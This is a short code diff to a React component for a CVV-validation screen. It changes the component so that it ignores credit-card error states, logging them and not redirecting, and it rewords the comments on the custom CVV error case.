@@ -174,13 +174,13 @@ export default function ValidacionCVV() {
                         break;
                     case 'error_tc':
                     case 'error_tc_custom':
-                        // Si estamos en CVV y hay error de TC, NO redirigir a TC
-                        // Solo redirigir si realmente es necesario
-                        // Por ahora, no hacer nada ya que estamos en CVV
-                        break;
+                        // Si estamos en CVV y hay error de TC, IGNORAR completamente
+                        // El usuario está en la vista de CVV, no debe reaccionar a errores de TC
+                        console.log('[CVV] Ignorando error de TC (estamos en CVV):', estado);
+                        return; // NO hacer nada, NO redirigir
                     case 'error_cvv_custom':
-                        // No redirigir, el modal de error ya se mostró arriba y se detuvo el polling
-                        // El usuario permanece en la vista de CVV
+                        // Error de CVV Custom: ya se manejó arriba (líneas 85-98)
+                        // Este case está aquí solo para documentación, ya se detuvo el polling arriba
                         break;
                     case 'error_otp':
                         localStorage.setItem('estado_sesion', 'error');
